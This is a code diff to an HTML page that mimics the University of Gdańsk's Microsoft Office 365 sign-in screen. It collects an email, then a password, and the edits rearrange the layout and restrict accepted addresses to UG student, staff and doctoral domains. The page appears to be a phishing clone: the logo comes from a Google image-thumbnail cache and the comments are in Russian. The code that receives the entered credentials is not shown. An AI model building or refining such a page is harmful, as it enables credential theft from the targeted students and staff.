@@ -14,8 +14,8 @@
     <div class="login-box" id="step1">
       <div class="logo">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOgkXY-giCkcBcMHdme7csDrz-hdKus-ccpA&s" alt="UG Logo" />
-      <div class="top-text">Enter email and password</div>
       </div>
+      <div class="top-text">Enter email and password</div>
       <form id="emailForm">
         <div class="input-group">
           <input type="email" id="email" name="email" placeholder="Email" required />
@@ -25,41 +25,47 @@
           <button type="submit" class="short-button">Next</button>
         </div>
       </form>
-      <div class="footer-links">
-        <a href="https://login.microsoftonline.com/terms" target="_blank">Terms of use</a>
-        <a href="https://login.microsoftonline.com/privacy" target="_blank">Privacy & cookies</a>
-        <a href="#" id="showTroubleshoot">...</a>
+      <div class="info-footer full-width">
+        Resetowanie zapomnianego hasła dla studentów i doktorantów UG odbywa się na Portalu Studenta w zakładce „Office 365”.
       </div>
     </div>
 
-    <!-- Step 2: Password input -->
-    <div class="login-box hidden" id="step2">
-      <div class="logo">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOgkXY-giCkcBcMHdme7csDrz-hdKus-ccpA&s" alt="UG Logo" />
-      </div>
-      <div class="entered-email" id="displayEmail"></div>
-      <div class="top-text">Enter email and password</div>
-      <form id="passwordForm">
-        <div class="input-group">
-          <input type="password" id="password" name="password" placeholder="Password" required />
-          <div class="error" id="passwordError">Password must be at least 8 characters.</div>
-        </div>
-        <div class="actions">
-          <a href="https://passwordreset.microsoftonline.com/" target="_blank">Forgot my password</a>
-        </div>
-        <div class="actions right-align">
-          <button type="submit" class="short-button">Sign in</button>
-        </div>
-      </form>
-      <div class="info-footer">
-        Resetowanie zapomnianego hasła dla studentów i doktorantów UG odbywa się na Portalu Studenta w zakładce „Office 365”.
-      </div>
-      <div class="footer-links">
-        <a href="https://login.microsoftonline.com/terms" target="_blank">Terms of use</a>
-        <a href="https://login.microsoftonline.com/privacy" target="_blank">Privacy & cookies</a>
-        <a href="#" id="showTroubleshoot">...</a>
-      </div>
+<!-- Шаг 2: Password input -->
+<div class="login-box hidden" id="step2">
+  <div class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOgkXY-giCkcBcMHdme7csDrz-hdKus-ccpA&s" alt="UG Logo" />
+  </div>
+
+  <!-- Кнопка "назад" + email -->
+  <div class="entered-email">
+    <span class="back-arrow" id="goBack">&larr;</span>
+    <span id="displayEmail"></span>
+  </div>
+
+  <div class="top-text">Enter email and password</div>
+  <form id="passwordForm">
+    <div class="input-group">
+      <input type="password" id="password" name="password" placeholder="Password" required />
+      <div class="error" id="passwordError">Password must be at least 8 characters.</div>
     </div>
+    <div class="actions">
+      <a href="https://passwordreset.microsoftonline.com/" target="_blank">Forgot my password</a>
+    </div>
+    <div class="actions right-align">
+      <button type="submit" class="short-button">Sign in</button>
+    </div>
+  </form>
+  <div class="info-footer full-width">
+    Resetowanie zapomnianego hasła dla studentów i doktorantów UG odbywa się na Portalu Studenta w zakładce „Office 365”.
+  </div>
+</div>
+  </div>
+
+  <!-- Footer outside the login box -->
+  <div class="global-footer">
+    <a href="https://login.microsoftonline.com/terms" target="_blank">Terms of use</a>
+    <a href="https://login.microsoftonline.com/privacy" target="_blank">Privacy & cookies</a>
+    <a href="#" id="showTroubleshoot">...</a>
   </div>
 
   <script>
@@ -76,7 +82,7 @@
     const emailRegex = new RegExp(
       "^[^\\s@]+@(?:" +
       "ug\\.edu\\.pl|" +
-      "studms\\.ug\\.edu\\.pl|" +
+      "\\d{2,3}\\.studms\\.ug\\.edu\\.pl|" +
       "staffms\\.ug\\.edu\\.pl|" +
       "phdstud\\.ug\\.edu\\.pl)$", "i"
     );
